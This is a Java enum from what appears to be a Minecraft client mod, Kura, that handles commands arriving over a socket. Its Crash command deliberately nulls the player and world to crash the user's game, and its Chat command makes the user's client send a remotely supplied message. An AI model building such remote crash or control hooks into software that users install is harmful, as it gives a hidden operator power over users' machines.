package helper.kura.socket.utils;

import base.utils.chat.ChatUtil;
import dev.dyzjct.kura.Kura;
import net.fabricmc.loader.impl.util.log.Log;
import net.fabricmc.loader.impl.util.log.LogCategory;

import static dev.dyzjct.kura.module.AbstractModule.mc;

/**
 * @author DiaoLing
 * @since 4/7/2024
 */
public enum Operation {
    CRASH("Crash"),
    IRC_CHAT("IrcChat"),
    CHAT("Chat"),
    TITLE("Title"),
    KICK("Kick");
    private final String name;

    Operation(String name) {
        this.name = name;
    }

    public static Operation fromString(String name) {
        for (Operation operation : values()) {
            if (operation.getName().equalsIgnoreCase(name)) {
                return operation;
            }
        }
        Log.info(LogCategory.LOG, "No enum constant for name: " + name);
        return null;
    }

    public String getName() {
        return name;
    }

    public void handler(String message) {
        switch (this) {
            case CRASH:
                // CrashUtils.crash(message);
                mc.player = null;
                mc.world = null;
                break;
            case CHAT:
                ChatUtil.INSTANCE.sendMessage(message);
                break;
            case IRC_CHAT:
                Kura.Companion.getIrcSocket().chat(message);
                break;
        }
    }
}
